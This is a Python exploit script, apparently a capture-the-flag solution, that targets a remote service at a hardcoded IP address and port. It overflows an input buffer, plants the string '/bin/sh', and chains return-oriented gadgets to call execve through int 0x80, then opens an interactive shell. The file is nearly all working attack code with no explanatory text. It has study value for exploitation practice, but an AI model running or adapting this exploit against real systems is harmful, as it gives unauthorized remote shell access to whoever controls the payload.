from zio import *

target = "./binary"
target = ("106.75.93.221", 12345)
#target = "./fake"

def get_io(target):
	r_m = COLORED(RAW, "green")
	w_m = COLORED(RAW, "blue")
	io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
	return io

def pwn(io):
	
	io.read_until("?")

	"""
	payload = ""
	payload += l32(0x08048B53)
	payload += "a"*(0x4f8-4)
	payload += l32(0x080eefa4)
	payload = payload.ljust(0x554, 'b')
	payload += l32(0x080EF9E0-4*0x73)
	io.gdb_hint()
	io.writeline(payload)
	"""

	payload = ""
	payload += "/bin/sh\x00".ljust(0x20, 'a')
	payload += l32(0x080EF9E0+0x24)
	payload += l32(0x8000)
	payload += 'a'*0x90
	payload += l32(0x080EF9E0 + 0x24+0x94+0x4)
	#payload += 'a'*0x20
	payload += 'a'*0xa
	payload += l32(0x204)  #or this val with esp
	payload += 'a'*(0x20-0xa-4)
	#payload += l32(0x080EF9E0 + 0x24+0x94+0x28)
	#0x080db19c : or esp, dword ptr [ebx + 0xe] ; adc al, 0x43 ; ret
	#0x080ea552 : or esp, dword ptr [edx + 0xa] ; ret
	payload += l32(0x080ea552)
	#payload += 'b'*4
	io.writeline(payload)

	io.read_until("> ")
	io.gdb_hint()


	binsh_addr = 0x080EF9E0
	#0x080e2c0d : pop ecx ; ret
	p_ecx_ret = 0x080e2c0d
	#0x0809baa4 : pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
	p_eax_ebx_ppp_ret = 0x0809baa4
	p_eax_ret = 0x080bbad6
	p_ebx_ret = 0x080481d1
	int80_addr = 0x0804dc35

	#0x08072f30 : pop edx ; pop ecx ; pop ebx ; ret
	p_edx_ecx_ebx_ret = 0x08072f30

	#0x0805d353 : inc eax ; pop edi ; ret
	inc_eax_p_ret = 0x0805d353

	#0x0804b7b8 : xchg eax, ebp ; ret
	xchg_eax_ebp_ret = 0x0804b7b8
	#0x080483ea : pop ebp ; ret
	p_ebp_ret = 0x080483ea

	rop_data = ""
	rop_data += l32(p_ebp_ret)
	rop_data += l32(0x8)
	rop_data += l32(xchg_eax_ebp_ret)
	for i in range(3*2):
		rop_data += l32(inc_eax_p_ret)

	rop_data += l32(p_edx_ecx_ebx_ret)
	rop_data += l32(0)
	rop_data += l32(0)
	rop_data += l32(binsh_addr)
	rop_data += l32(int80_addr)

	payload = ""
	payload += "2aaa"
	payload += "b"*(0x100-4)
	payload += rop_data
	payload += "c"*0x40
	payload += "d"*0x40
	io.writeline(payload)

	io.interact()

io = get_io(target)
pwn(io)